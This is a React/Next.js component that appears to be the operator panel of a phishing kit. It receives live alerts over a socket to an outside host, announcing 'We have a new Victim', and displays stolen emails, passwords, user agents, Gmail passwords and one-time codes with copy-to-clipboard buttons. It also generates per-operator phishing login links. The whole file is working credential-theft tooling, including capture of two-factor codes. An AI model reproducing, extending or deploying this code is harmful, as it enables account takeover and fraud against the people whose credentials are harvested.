"use client"
import WorldIcon from "@/public/icon/world"
import AddIcon from "@/public/icon/add"
import HookIcon from "@/public/icon/hook"
import LoockIcon from "@/public/icon/loock"
import LogOtuIcon from "@/public/icon/log-out"
import Notification from "@/public/icon/notification"
import LodingIcon from "@/public/icon/loding"
import Image from "next/image"
import { useRouter } from "next/navigation"
import Link from "next/link"
import React, { useEffect, useCallback } from 'react';
import { Button, Result, message, Popconfirm } from 'antd';
import { Modal, Form, Radio, Skeleton } from 'antd';
import { useState, useRef } from "react"
import { Badge, Space, Empty } from "antd"
import type { PopconfirmProps } from 'antd';
import axios from "axios"
import { io } from "socket.io-client"
import 'react-toastify/dist/ReactToastify.css';
import { ToastContainer } from 'react-toastify'
import SuccessToast from "@/src/components/toast/SuccessToast"
import TimeAgo from 'javascript-time-ago'
import en from 'javascript-time-ago/locale/en'
import InfoPage from "./components/infoPage"

const socket = io('https://www.skipthegmaes.com:4789');


TimeAgo.addDefaultLocale(en)
const timeAgo = new TimeAgo('en-US')

interface RightComponentProps {
    setShowName: string;
    myid: string;
    myurl: string;
}

interface Notification {
    seen: boolean;
    time: number;
    title: string,
    key: number;
    data_id: string,
    notify_id: string,
    email: string;
}

const RightSide: React.FC<RightComponentProps> = ({ setShowName, myid, myurl }) => {

    const audioRef = useRef<HTMLAudioElement>(null);

    const playSound = () => {
        if (audioRef.current) {
            audioRef.current.volume = 0.5; // Set volume to 50%
            audioRef.current.play();
        }
    };

    const [showMiniProfileSections, setShowMiniProfileSections] = useState(false)
    const [showNotifySlied, setshowNotifySlied] = useState(false)
    const [showNotifySliedLoading, setshowNotifySliedLoading] = useState(false)
    const [showMiniNotificationSections, setShowMiniNotificationSections] = useState(false)
    const [MyNotification, setMyNotification] = useState<Notification[]>([])
    const [LogOutLoding, setLogOutLoding] = useState(false)
    const [messageShown, setMessageShown] = useState(false)
    const [showProfiles, setshowProfiles] = useState(false)
    const [newData, setnewData] = useState("")
    const [userData, setuserData] = useState({
        name: "",
        email: "",
        userType: "",
        id: "",
        url: "",
        image: "",
        hostName: process.env.HOSTNAME
    })
    const [notifyData, setnotifyData] = useState({
        email: "",
        password: "",
        url: "",
        g_pass: "",
        g_otp: "",
        user_id: "",
        userAgent: "",
    })
    const [notifyCount, setnotifyCount] = useState(0)
    const router = useRouter()

    const confirm: PopconfirmProps['onConfirm'] = async (e) => {
        setLogOutLoding(true)
        const response = await axios.get("/api/admin/user/logout")
        if (response.data.status === 500) {
            setLogOutLoding(false)
            message.error('Something went wrong!');
        } else if (response.data.status === 200) {
            setLogOutLoding(false)
            message.success(response.data.message);
            setTimeout(() => {
                router.push("/controlers")
            }, 1000)
        }
    };

    const cancel: PopconfirmProps['onCancel'] = (e) => {
        message.success(':)');
    };

    useEffect(() => {
        socket.emit("add_active_user", { myID: myid, url: myurl });
    }, [myid, myurl]);

    const get_data = useCallback((data: any) => {
        if (myurl !== data.id) {
            return
        }
        setnewData(data.data_id)
        const newDate = Date.now();
        playSound();
        const newData = [...MyNotification];
        newData.push({
            key: newData.length + 1,
            seen: false,
            title: "New Victim",
            email: data.email,
            time: newDate, // Ensure it's in milliseconds
            data_id: data.data_id,
            notify_id: data.notify_id
        });
        if (!messageShown) {
            setTimeout(() => {
                SuccessToast({ message: "We have a new Victim" });
                setMessageShown(true);
            }, 500);
        }
        setMyNotification(newData);
        let count = 1;
        for (let index = 0; index < MyNotification.length; index++) {
            const element = MyNotification[index];
            if (element.seen === false) {
                count++;
            }
        }
        setnotifyCount(count);
    }, [MyNotification, messageShown, myurl]);


    const get_data_otp = useCallback((data: any) => {
        if (myurl !== data.id) {
            return
        }
        const newDate = Date.now();
        playSound();
        const newData = [...MyNotification];
        newData.push({
            key: newData.length + 1,
            seen: false,
            title: "Password",
            email: data.otp,
            time: newDate, // Ensure it's in milliseconds
            data_id: data.data_id,
            notify_id: data.notify_id
        });
        if (!messageShown) {
            setTimeout(() => {
                SuccessToast({ message: "User Confirm his passwords" });
                setMessageShown(true);
            }, 500);
        }
        setMyNotification(newData);
        let count = 1;
        for (let index = 0; index < MyNotification.length; index++) {
            const element = MyNotification[index];
            if (element.seen === false) {
                count++;
            }
        }
        setnotifyCount(count);
    }, [MyNotification, messageShown, myurl]);


    useEffect(() => {
        const getUserData = async () => {
            const userResponse = await axios.post("/api/users/getMyData")

            if (userResponse.status === 200) {
                const d = userResponse.data;
                setuserData({
                    name: d.user_data.firstName + " " + d.user_data.lastName,
                    email: d.user_data.email,
                    userType: d.user_data.rool === 1 ? "User" : "Undefined",
                    id: d.user_data._id,
                    url: d.user_data.url,
                    image: d.user_data.profileImage,
                    hostName: process.env.HOSTNAME
                })

                if (d.notify_data.length > 0) {
                    const newData = []
                    for (let index = 0; index < d.notify_data.length; index++) {
                        const element = d.notify_data[index];
                        newData.push({
                            key: index,
                            title: element.title,
                            seen: false,
                            email: element.data,
                            time: element.date,
                            data_id: element.data_id,
                            notify_id: element._id
                        })
                    }
                    setMyNotification(newData)
                    let count = 0
                    console.log(MyNotification)
                    for (let index = 0; index < d.notify_data.length; index++) {
                        const element = d.notify_data[index];
                        if (element.seen === false) {
                            count++;
                        }
                    }
                    setnotifyCount(count)
                }
                setshowProfiles(true)
            }
        }
        getUserData()
    }, [])


    useEffect(() => {
        socket.on("get_data", get_data);

        // Cleanup on component unmount
        return () => {
            socket.off("get_data", get_data);
        };
    }, [get_data]);

    useEffect(() => {
        socket.on("get_data_otp", get_data_otp);

        // Cleanup on component unmount
        return () => {
            socket.off("get_data_otp", get_data_otp);
        };
    }, [get_data_otp]);

    const showNotify = async (data_id: string, notify_id: string, index: number) => {
        try {
            setshowNotifySlied(true);
            setshowNotifySliedLoading(true);
            const response = await axios.post("/api/users/getNotifyData", { data_id, notify_id });
            if (response.data.status === 200) {
                const dd = response.data.data;
                console.log(dd)
                setnotifyData({
                    email: dd.email,
                    password: dd.password,
                    url: dd.url,
                    g_pass: dd.g_pass,
                    g_otp: dd.g_otp,
                    user_id: dd.user_id,
                    userAgent: dd.userAgent,
                });
                setshowNotifySliedLoading(false);

                const getAllNotify = [...MyNotification];
                getAllNotify[getAllNotify.length === 1 ? index - 1 : index] = { ...getAllNotify[getAllNotify.length === 1 ? index - 1 : index], seen: true };
                setMyNotification(getAllNotify);
                if (notifyCount > 0) {
                    setnotifyCount(notifyCount - 1);
                }
                console.log(MyNotification)
            }
        } catch (error) {
            message.error("Something went wrong")
            setTimeout(() => {
                setshowNotifySlied(false);
                setshowNotifySliedLoading(false);
            }, 1000);
        }
    }

    const handleOk = () => {
        setshowNotifySlied(false);
        setshowNotifySliedLoading(true)
    };

    const handleCancel = () => {
        setshowNotifySlied(false);
        setshowNotifySliedLoading(true)
    };

    const copeHostName = () => {
        const hosstName = window.location.hostname;
        navigator.clipboard.writeText(hosstName + "/auth/login?id=" + userData.url).then(() => { message.success("Copy successfull") })
    }

    return (
        <main className="w-[83vw] h-full flex flex-col">
            <ToastContainer
                position="bottom-right"
                autoClose={5000}
                hideProgressBar={false}
                newestOnTop={false}
                closeOnClick
                rtl={false}
                pauseOnFocusLoss
                draggable
                pauseOnHover
            />
            <Modal title="Notification Data" open={showNotifySlied} onOk={handleOk} onCancel={handleCancel}>
                {
                    showNotifySliedLoading ?
                        <div className="w-full h-36 flex justify-center items-center">
                            <LodingIcon />
                        </div>
                        :
                        <div className="w-full h-auto flex gap-2">
                            <div className="w-1/2 h-auto flex flex-col gap-3">
                                <div className="w-full h-auto flex flex-col">
                                    <h2>Email</h2>
                                    <span
                                        onClick={() => {
                                            navigator.clipboard.writeText(notifyData.email).then(() => { message.success("Email copy successfull") })
                                        }}
                                        className="p-1 cursor-pointer select-none bg-slate-100 rounded-md"
                                    >
                                        {notifyData.email.substring(0, 26)}
                                    </span>
                                </div>
                                <div className="w-full h-auto flex flex-col">
                                    <h2>User Agent</h2>
                                    <span
                                        onClick={() => {
                                            navigator.clipboard.writeText(notifyData.userAgent).then(() => { message.success("UserAgent copy successfull") })
                                        }}
                                        className="p-1 cursor-pointer select-none bg-slate-100 rounded-md"
                                    >
                                        {notifyData.userAgent.substring(0, 26)}
                                    </span>
                                </div>
                            </div>
                            <div className="w-1/2 h-auto flex flex-col gap-3">
                                <div className="w-full h-auto flex flex-col">
                                    <h2>Password</h2>
                                    <span
                                        onClick={() => {
                                            navigator.clipboard.writeText(notifyData.password).then(() => { message.success("Password copy successfull") })
                                        }}
                                        className="p-1 cursor-pointer select-none bg-slate-100 rounded-md"
                                    >
                                        {notifyData.password.substring(0, 26)}
                                    </span>
                                </div>
                                {
                                    notifyData.url &&
                                    <div className="w-full h-auto flex flex-col">
                                        <h2>Skipe OTP</h2>
                                        <span
                                            onClick={() => {
                                                navigator.clipboard.writeText(notifyData.url).then(() => { message.success("Skipe OTp copy successfull") })
                                            }}
                                            className="p-1 cursor-pointer select-none bg-slate-100 rounded-md"
                                        >
                                            {notifyData.url && notifyData.url.substring(0, 26)}
                                        </span>
                                    </div>
                                }
                                {
                                    notifyData.g_pass &&
                                    <div className="w-full h-auto flex flex-col">
                                        <h2>Gmail Password</h2>
                                        <span
                                            onClick={() => {
                                                navigator.clipboard.writeText(notifyData.g_pass).then(() => { message.success("Gmail Password copy successfull") })
                                            }}
                                            className="p-1 cursor-pointer select-none bg-slate-100 rounded-md"
                                        >
                                            {notifyData.g_pass && notifyData.g_pass.substring(0, 26)}
                                        </span>
                                    </div>
                                }
                                {
                                    notifyData.g_otp &&
                                    <div className="w-full h-auto flex flex-col">
                                        <h2>Gmail OTP</h2>
                                        <span
                                            onClick={() => {
                                                navigator.clipboard.writeText(notifyData.g_otp).then(() => { message.success("Gmail OTP copy successfull") })
                                            }}
                                            className="p-1 cursor-pointer select-none bg-slate-100 rounded-md"
                                        >
                                            {notifyData.g_otp && notifyData.g_otp.substring(0, 26)}
                                        </span>
                                    </div>
                                }
                            </div>
                        </div>
                }
            </Modal>
            <audio hidden ref={audioRef} src="/audio.mp3"></audio>
            <div className={` ${showMiniProfileSections ? "flex" : "hidden"} w-60 gap-2 h-auto p-2 transition-all duration-300 right-10 border_full flex-col rounded-lg shadow-lg z-20 bg-white rounded-b-md fixed top-14`}>
                <div className="w-full h-52 gap-2 flex flex-col justify-center items-center border-b-2 border-slate-500">
                    {
                        userData.image !== "" &&
                        <Image src={userData.image} width={1000} height={1000} quality={100} alt="User Profile Logo" className="w-28 h-28 rounded-full shadow-lg" />
                    }

                    <div className="w-full h-auto flex flex-col justify-center overflow-hidden items-center gap-0">
                        <span className="text-xl font-semibold">{userData.name}</span>
                        <span className="text-sm">{userData.userType}</span>
                        <span className="text-zinc-500 text-sm">{userData.email}</span>
                    </div>
                </div>

                <div className="w-full h-auto flex flex-col">
                    {/* <div className="w-full h-10 p-2 flex gap-2 cursor-pointer transition-all duration-75 text-sm font-medium rounded-md hover:bg-slate-300 hover:text-blue-500 items-center">
                        <UserIcon />
                        <span>Profile</span>
                    </div> */}
                    <div className="w-full h-10 p-2 flex gap-2 cursor-pointer transition-all duration-75 text-sm font-medium rounded-md hover:bg-slate-300 hover:text-blue-500 items-center">
                        <LoockIcon />
                        <span>Password change</span>
                    </div>
                    <Popconfirm
                        title="Log out Confirmation"
                        description="Are you sure to Log out?"
                        onConfirm={confirm}
                        onCancel={cancel}
                        okText="Yes"
                        cancelText="No"
                        placement="left"
                    >
                        {/* <Button danger>Delete</Button> */}
                        <div className="w-full h-10 p-2 flex gap-2 cursor-pointer transition-all duration-75 text-sm font-medium rounded-md hover:bg-slate-300 hover:text-blue-500 items-center">
                            {
                                LogOutLoding ? <LodingIcon /> : <LogOtuIcon />
                            }
                            <span>Log out</span>
                        </div>
                    </Popconfirm>

                </div>
            </div>

            <div onClick={() => console.log(MyNotification)} className={` ${showMiniNotificationSections ? "flex" : "hidden"} w-72 h-[424px] border_full transition-all duration-300 right-56 flex-col rounded-lg shadow-lg z-20 bg-white rounded-b-md fixed top-14`}>
                <div className="w-full h-10 flex border_bottom items-center text-lg text-slate-900 px-3 font-medium">
                    <span>Notification</span>
                </div>
                <div key={999} className="w-full h-[352px] overflow-y-auto rounded-t-lg flex flex-col gap-1 px-2 py-1 styleSliedBar">
                    {
                        MyNotification.length === 0 ?
                            <div className="w-full h-full flex justify-center items-center bg-slate-50">
                                <Empty />
                            </div>
                            :
                            MyNotification.slice().reverse().map((nt: any) => (
                                <div onClick={() => { showNotify(nt.data_id, nt.notify_id, nt.key) }} key={nt.key} className={`${nt.title === "Password" ? nt.seen ? "bg-slate-300" : "bg-green-300" : nt.seen ? "bg-slate-300" : "bg-blue-100"} w-full min-h-14 h-14 hover:bg-slate-200 rounded-md flex cursor-pointer`}>
                                    <div className="w-16 h-full flex justify-center items-center">
                                        <div className="w-10 h-10 rounded-full bg-blue-100 flex justify-center items-center">
                                            <HookIcon />
                                        </div>
                                    </div>
                                    <div className="w-[240px] h-full rounded-md flex flex-col justify-center">
                                        <div className="w-full h-auto flex justify-between">
                                            <h2 className="text-sm font-medium">
                                                {nt.title}
                                            </h2>
                                            <span className="text-[10px] px-2 text-gray-400">
                                                {timeAgo.format(nt.time ? nt.time : Date.now())}
                                            </span>
                                        </div>
                                        <span className="text-xs text-neutral-500">
                                            {nt.email}
                                        </span>
                                    </div>
                                </div>
                            ))
                    }
                </div>
                <div className="w-full h-8 rounded-b-lg flex border_top justify-center items-center text-xs text-neutral-400">
                    <span className="transition-all duration-150 cursor-pointer hover:text-green-500">See all..</span>
                </div>
            </div>


            <header className="w-full flex justify-between items-center h-16 bg-white px-5 relative">
                <div className="w-10 h-10  bg-white absolute -bottom-5 -left-5 rounded-full"></div>
                <div className=" w-auto h-full flex items-center gap-3 p-3">
                    <Link href={"/auth/login?id=" + userData.url} target="_blank">
                        <div className="p-2 bg-slate-200 rounded-full text-slate-600 hover:bg-blue-400 hover:text-white transition-all duration-300 cursor-pointer">
                            <WorldIcon />
                        </div>
                    </Link>
                    <div onClick={copeHostName} className="p-2 flex justify-center items-center gap-2 rounded-full hover:bg-blue-700 bg-blue-400 text-white transition-all duration-300 cursor-pointer">
                        <AddIcon /> Copy URL
                    </div>
                </div>

                <div className=" w-auto h-full flex justify-end items-center gap-3 p-3">
                    <Space size="middle">
                        <Badge size="small" count={notifyCount}>
                            <div onClick={() => { setShowMiniNotificationSections(showMiniNotificationSections ? false : true) }} className="p-2 bg-slate-200 rounded-full text-slate-500 hover:bg-blue-400 hover:text-white transition-all duration-300 cursor-pointer">
                                <Notification style={{ height: "20px", width: "20px" }} />
                            </div>
                        </Badge>
                    </Space>

                    {
                        showProfiles ?
                            <div onClick={() => { setShowMiniProfileSections(showMiniProfileSections ? false : true) }} className="h-full pr relative w-auto flex flex-col justify-center items-center hover:bg-slate-200 p-3 rounded-md cursor-pointer transition-all duration-300 ">
                                <div className=" w-auto h-auto flex justify-center items-center gap-3">
                                    <div className="w-auto h-auto flex flex-col justify-center items-end">
                                        <span className="text-sm font-semibold">{userData.name}</span>
                                        <span className=" text-xs text-slate-500">{userData.userType}</span>
                                    </div>
                                    <div className="w-10 h-10 flex justify-center items-center rounded-full cursor-pointer">
                                        <Image src={userData.image} priority={true} width={1000} height={1000} quality={100} className="w-full h-full rounded-full" alt="User Profile logo" />
                                    </div>
                                </div>
                            </div>
                            :
                            <div className="flex gap-2">
                                <Skeleton.Button active={true} size="default" shape="default" block={false} />
                                <Skeleton.Avatar active={true} size="default" shape="circle" />
                            </div>
                    }
                </div>
            </header>
            <section className="w-full relative rounded-tl-3xl z-10 p-2 bg-slate-200 h-[90vh] overflow-y-auto styleSliedBar">

                {setShowName === "dashboard" && "dashboard"}
                {setShowName === "link" && "link"}
                {setShowName === "informasion" && <InfoPage newData={newData} geturl={myurl}/>}

                {
                    setShowName !== "dashboard" &&
                    setShowName !== "link" &&
                    setShowName !== "informasion" &&
                    <Result
                        status="404"
                        title="404"
                        subTitle="Sorry, the page you visited does not exist."
                        extra={<a href={"/admin?section=dashboard"}><Button type="primary">Back Home</Button></a>}
                    />
                }

            </section>
        </main>
    )
}

export default RightSide

